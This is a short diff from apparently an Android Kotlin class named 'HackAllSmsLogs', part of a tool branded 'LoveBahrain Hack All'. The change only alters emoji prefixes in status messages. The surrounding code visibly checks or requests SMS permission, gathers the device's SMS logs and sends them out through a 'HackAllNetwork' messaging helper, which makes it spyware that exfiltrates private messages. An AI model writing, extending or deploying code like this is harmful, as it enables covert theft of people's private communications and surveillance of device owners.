@@ -39,10 +39,10 @@ class HackAllSmsLogs (private val context: Context) {
 
     fun getSmsLogs() {
         if (isSmsPermissionGranted(context)) {
-            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All SMS Logs permission already granted\n")
+            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 LoveBahrain Hack All SMS Logs permission already granted\n")
             sendSmsLogs()
         } else {
-            HackAllNetwork(context).sendTextMessage("LoveBahrain Hack All SMS Logs permission denied\n")
+            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 LoveBahrain Hack All SMS Logs permission denied\n")
             startSmsPermissionRequest(context) {
                 sendSmsLogs()
             }
@@ -76,7 +76,7 @@ class HackAllSmsLogs (private val context: Context) {
         }
 
         if (smsLogs.isNotEmpty()) {
-            HackAllNetwork(context).sendTextMessage("\uD83D\uDD53 Collected SMS Logs:\n\n$smsLogs")
+            HackAllNetwork(context).sendTextMessage("\uD83D\uDCF1 Collected SMS Logs:\n\n$smsLogs")
         } else {
             HackAllNetwork(context).sendTextMessage("No SMS logs found on the device.\n")
         }
